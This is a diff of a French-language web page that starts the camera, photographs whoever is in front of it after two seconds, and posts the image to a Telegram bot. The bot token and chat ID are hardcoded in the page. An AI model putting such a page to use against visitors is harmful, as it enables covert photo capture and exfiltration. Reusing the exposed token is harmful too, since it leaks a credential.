@@ -7,7 +7,7 @@
 <style>
   body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
   video, canvas { max-width: 90%; border-radius: 12px; margin: 10px auto; display: block; }
-  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; }
+  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; white-space: pre-wrap; }
 </style>
 </head>
 <body>
@@ -17,56 +17,42 @@
 <div id="status">En attente de la caméra...</div>
 
 <script>
-const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec";
+const TOKEN = "8923372171:AAH60PG4woDX9kR3CpD6IIIY4oWnUbDm6-c";      // ex: "123456789:AAHxxxxxxx..."
+const CHAT_ID = "8675191556";  // ex: "123456789"
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const status = document.getElementById('status');
 
-// 1. Démarrage caméra
 navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
-  .then(stream => {
-    video.srcObject = stream;
-    video.play();
-  })
+  .then(stream => { video.srcObject = stream; video.play(); })
   .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });
 
-// 2. Dès que la vidéo joue vraiment, on attend 2 sec puis photo auto + envoi
 video.addEventListener('playing', () => {
   status.textContent = "⏳ Photo dans 2 secondes...";
   setTimeout(prendrePhoto, 2000);
 });
 
 function prendrePhoto() {
-  if (!video.videoWidth) {
-    setTimeout(prendrePhoto, 300); // caméra pas prête, on réessaie
-    return;
-  }
+  if (!video.videoWidth) { setTimeout(prendrePhoto, 300); return; }
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
   canvas.style.display = 'block';
 
-  const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
-  status.textContent = "📤 Envoi vers Telegram...";
-  envoyerVersTelegram(base64);
-}
-
-function envoyerVersTelegram(base64Image) {
-  fetch(APPS_SCRIPT_URL, {
-    method: "POST",
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify({ image: base64Image, nom: "auto_" + Date.now() + ".jpg" })
-  })
-  .then(r => r.text())
-  .then(txt => {
-    console.log("Réponse Apps Script :", txt);
-    status.textContent = txt.includes('"ok":true')
-      ? "✅ Photo envoyée sur ton Telegram !"
-      : "⚠️ Réponse inattendue : " + txt;
-  })
-  .catch(err => { status.textContent = "❌ Erreur d'envoi : " + err.message; });
+  canvas.toBlob(blob => {
+    status.textContent = "📤 Envoi vers Telegram...";
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob, "photo.jpg");
+    fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: form })
+      .then(r => r.json())
+      .then(json => {
+        if (json.ok) status.textContent = "✅ Photo reçue sur ton Telegram !";
+        else status.textContent = "⚠️ Erreur Telegram :\n" + JSON.stringify(json, null, 2);
+      })
+      .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
+  }, "image/jpeg", 0.9);
 }
 </script>
 </body>
